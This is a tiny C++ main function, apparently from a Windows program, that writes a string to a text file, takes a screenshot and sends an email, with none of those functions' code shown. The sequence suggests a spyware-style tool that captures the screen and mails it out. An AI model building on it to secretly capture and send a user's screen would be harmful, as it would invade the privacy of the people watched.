#include "stdafx.h"
#include "Screenshot.h"
#include "SendEmail.h"

int main ()
{

	Mail::WriteStringToText ();
	ScreenShot::ScreenShot ();
	Mail::SendMail ();
	return 0;
}